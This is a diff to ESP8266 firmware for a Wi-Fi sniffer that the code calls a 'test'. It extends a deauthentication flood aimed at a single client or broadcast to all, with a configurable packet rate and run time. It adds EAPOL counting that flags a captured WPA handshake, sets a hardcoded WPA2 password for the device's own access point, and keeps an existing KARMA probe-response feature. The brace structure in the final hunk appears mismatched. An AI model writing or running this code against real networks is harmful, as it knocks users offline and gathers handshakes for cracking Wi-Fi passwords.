@@ -95,6 +95,7 @@ struct APInfo {
   uint32_t ctrlCount;
   uint32_t lastSeenMs;
   uint32_t beaconCount;
+  uint32_t eapolCount;
 };
 
 struct ClientInfo {
@@ -110,6 +111,9 @@ struct ClientInfo {
   uint16_t roamCount;
   uint8_t associatedBssid[6];
   uint16_t channelHits[15]; // 1..14 used
+  uint32_t eapolCount;
+  uint32_t lastEapolMs;
+  bool handshakeSeen;
 };
 
 static APInfo g_aps[32];
@@ -430,10 +434,21 @@ volatile uint8_t deauthTarget[6] = {0};
 volatile uint8_t deauthBssid[6] = {0};
 volatile uint32_t deauthSentCount = 0;
 volatile bool deauthBroadcast = false;  // if true, destination is broadcast (all clients)
+volatile uint32_t deauthIntervalMs = 100; // default ~10 pps
+volatile uint32_t deauthEndAtMs = 0;      // 0 = no auto stop
 
 // Add this function to send deauthentication frames
 void sendDeauth() {
   if (!deauthTestActive) return;
+  if (deauthEndAtMs != 0) {
+    uint32_t now = millis();
+    if (now >= deauthEndAtMs) {
+      deauthTestActive = false;
+      deauthBroadcast = false;
+      deauthTicker.detach();
+      return;
+    }
+  }
   
   // Construct deauthentication frame (management frame type 0, subtype 12)
   uint8_t packet[26] = {
@@ -597,7 +612,8 @@ const uint32_t printIntervalMs = 30;  // minimum ms between prints
 
 // -------------------- Web server / SoftAP --------------------
 ESP8266WebServer server(80);
-const char *apSsid = "ESP8266-Sniffer";
+const char *apSsid = "Magesium";
+const char *apPass = "M4ges1um"; // WPA2 PSK (8-63 chars)
 IPAddress apIp(192, 168, 4, 1);
 IPAddress apGw(192, 168, 4, 1);
 IPAddress apMask(255, 255, 255, 0);
@@ -615,6 +631,8 @@ String buildStatusJson() {
   s += "\"deauthTestActive\":"; s += (deauthTestActive ? "true" : "false"); s += ",";
   s += "\"deauthSentCount\":"; s += String(deauthSentCount); s += ",";
   s += "\"deauthBroadcast\":"; s += (deauthBroadcast ? "true" : "false"); s += ",";
+  s += "\"deauthRatePps\":"; s += String(deauthIntervalMs ? (1000UL / deauthIntervalMs) : 0); s += ",";
+  s += "\"deauthEndsAtMs\":"; s += String(deauthEndAtMs); s += ",";
   
   char macStr[18];
   if (deauthTestActive) {
@@ -632,8 +650,8 @@ String buildStatusJson() {
 void startAccessPoint(uint8_t channel) {
   // Configure AP IP
   WiFi.softAPConfig(apIp, apGw, apMask);
-  // Open network, hidden=false, max_conn=2
-  WiFi.softAP(apSsid, "", channel, false, 2);
+  // Protected network (WPA2-PSK), hidden=false, max_conn=2
+  WiFi.softAP(apSsid, apPass, channel, false, 2);
 }
 
 void restartAccessPointOnChannel(uint8_t channel) {
@@ -1144,11 +1162,27 @@ void setupHttpHandlers() {
       return;
     }
     
+    // Optional rate and duration
+    uint32_t rate = 10; // packets per second
+    if (server.hasArg("rate")) {
+      rate = (uint32_t)server.arg("rate").toInt();
+      if (rate < 1) rate = 1; if (rate > 100) rate = 100;
+    }
+    uint32_t durationMs = 0; // 0 = run until stopped
+    if (server.hasArg("duration")) {
+      durationMs = (uint32_t)server.arg("duration").toInt();
+      if (durationMs > 60UL * 60UL * 1000UL) durationMs = 60UL * 60UL * 1000UL; // cap at 1h
+    }
+
+    deauthIntervalMs = 1000UL / rate;
+    deauthEndAtMs = durationMs ? (millis() + durationMs) : 0;
+
     // Start deauth test
     deauthTestActive = true;
     deauthSentCount = 0;
     deauthBroadcast = broadcast;
-    deauthTicker.attach_ms(100, sendDeauth); // 10 packets per second
+    deauthTicker.detach();
+    deauthTicker.attach_ms(deauthIntervalMs, sendDeauth);
     server.send(200, "text/plain", "ok");
   });
 
@@ -1229,7 +1263,7 @@ static void wifiSnifferCallback(uint8_t *buf, uint16_t len) {
         uint8_t ch = wifi_get_channel();
         if (ch >= 1 && ch <= 14) g_clients[cliIdx].channelHits[ch]++;
 
-        // KARMA: reply to probe requests with SSID IE
+    // KARMA: reply to probe requests with SSID IE
         if (karmaActive && subtype == 0x04) {
           // parse SSID IE
           const uint8_t *ie = body; uint16_t r = bodyLen;
@@ -1242,7 +1276,27 @@ static void wifiSnifferCallback(uint8_t *buf, uint16_t len) {
               break;
             }
             ie += 2 + l; r -= 2 + l;
+      }
+    } else if (type == 2 /* DATA */) {
+      // Minimal EAPOL detection: LLC SNAP header followed by EAPOL EtherType 0x888E
+      // We need at least rx_ctrl + 802.11 header + LLC/SNAP (8) + EAPOL(1)
+      if (len > sizeof(SnifferRxCtrl) + sizeof(WifiMacHeader) + 8) {
+        const uint8_t *pl = (const uint8_t *)(&mp->payload[0]);
+        // Look for LLC SNAP: AA AA 03 00 00 00 88 8E
+        if (pl[0]==0xAA && pl[1]==0xAA && pl[2]==0x03 && pl[3]==0x00 && pl[4]==0x00 && pl[5]==0x00 && pl[6]==0x88 && pl[7]==0x8E) {
+          // Count per AP and per client
+          int apIdx = ensureApIndex(mp->header.addr3);
+          g_aps[apIdx].eapolCount++;
+          int cliIdx = ensureClientIndex(mp->header.addr2);
+          g_clients[cliIdx].eapolCount++;
+          g_clients[cliIdx].lastEapolMs = millis();
+          // Heuristic: if we observe >=4 EAPOL frames between the same parties within a window, mark handshake seen
+          if (g_clients[cliIdx].eapolCount >= 4) {
+            g_clients[cliIdx].handshakeSeen = true;
+            memcpy(g_clients[cliIdx].associatedBssid, mp->header.addr3, 6);
           }
+        }
+      }
         }
       }
     } else if (type == 1 /* CTRL */) {
